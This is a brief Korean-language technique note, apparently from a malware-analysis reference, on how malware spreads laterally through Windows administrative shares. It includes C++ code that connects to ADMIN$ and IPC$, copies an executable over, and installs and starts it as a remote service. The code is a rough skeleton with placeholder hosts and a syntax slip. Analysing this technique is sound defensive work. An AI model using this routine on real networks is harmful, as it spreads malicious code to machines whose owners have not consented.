### Concept

악성 코드는 자신을 다른 컴퓨터로 퍼트리기 위해 Admin Share를 이용함.

### Code Flow

1. WNetAddConnection2W API를 사용하여 ADMIN\$, IPC\$ 폴더와 연결
2. ADMIN\$ 폴더에 실행하고자하는 파일 생성
3. 서비스를 생성하고 시작
4. WNetCancelConnection2W API를 사용하여 ADMIN\$, IPC\$ 폴더와 연결 해제

### Example

```c++
nr.lpRemoteName = "\\dns_host_name\ADMIN$";
WNetAddConnection2W(&nr,0x0,0x0,0x0);
nr.lpRemoteName ="\\dns_host_name\IPC$";
WNetAddConnection2W(&nr,0x0,0x0,0x0);

CreateDirectoryW("\\(dNSHostName)\ADMIN$\Temp\", 0x0);
CopyFileW(malware_path, "\\(dNSHostName)\ADMIN$\Temp\example.exe", 0x0);
h_scm = OpenSCManagerW("\\(dNSHostName)\", NULL, 0xf003f);
h_sc = CreateServiceW(h_scm, "example", "example", 0xf01ff, 0x110, 0x3, 0x1,
                      "%%SystemRoot%%\Temp\example.exe -k LocalServiceNetworkRestricted,
                      NULL, NULL, NULL, NULL, NULL);
StartServiceW(h_sc, 0x0, NULL);
CloseServiceHandle(h_sc);
CloseServiceHandle(h_scm);

WNetCancelConnection2W("\\dns_host_name\ADMIN$", 0x0, 0x0);
WNetCancelConnection2W("\\dns_host_name\IPC$", 0x0, 0x0);
```